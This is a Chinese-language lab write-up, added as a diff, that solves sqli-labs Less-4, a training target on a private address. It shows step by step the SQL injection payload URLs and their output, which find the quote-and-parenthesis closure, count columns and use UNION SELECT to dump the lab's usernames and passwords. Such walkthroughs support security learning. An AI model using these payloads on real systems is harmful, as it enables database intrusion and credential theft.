@@ -1,0 +1,54 @@
+url:http://10.0.2.15/sqli/Less-4/?id=1
+显示：用户名和密码
+url:http://10.0.2.15/sqli/Less-4/?id=1%27
+显示：用户名和密码
+url:http://10.0.2.15/sqli/Less-4/?id=1)
+显示：用户名和密码
+
+于是推测可能是使用了双引号闭合了任何输入，此时任何输入都会被当作字符串处理
+
+url:http://10.0.2.15/sqli/Less-4/?id=1%22
+显示：报错'  "1"") LIMIT 0,1  '
+
+或者用‘\’（转移字符）
+显示：报错'  "1\") LIMIT 0,1  '
+
+即正常情况下（id=1）应为("1") limit 0,1
+故推测sql: select username,password from 用户表 where id = ("输入的id") limit 0,1;
+
+验证：
+url:http://10.0.2.15/sqli/Less-4/?id=1%22)%20--%20
+显示：用户名和密码
+故可证明推测成立
+
+拆解：
+方法一：
+1.字段数
+http://10.0.2.15/sqli/Less-4/?id=1") order by 3--+
+显示用户名和密码，说明字段数至少为3
+http://10.0.2.15/sqli/Less-4/?id=1") order by 4--+
+报错，说明字段数为3
+
+2.数据库名
+http://10.0.2.15/sqli/Less-4/?id=0")--+
+无id=0的记录
+http://10.0.2.15/sqli/Less-4/?id=0") UNION SELECT 1,database(),3--+
+数据库名为security
+
+3.表名
+http://10.0.2.15/sqli/Less-4/?id=0") UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'security'--+
+返回值users,uagents,emails,referers
+猜测应在users表中
+
+4.字段名
+http://10.0.2.15/sqli/Less-4/?id=0") UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name = 'users'--+
+返回值id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
+猜测username就是用户名，password就是密码
+
+5.字段值
+http://10.0.2.15/sqli/Less-4/?id=0") UNION SELECT 1,group_concat(username,0x3a,password),3 from users--+
+返回结果：
+Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
+
+方法二（使用sqlmap）：
+过程同Less1
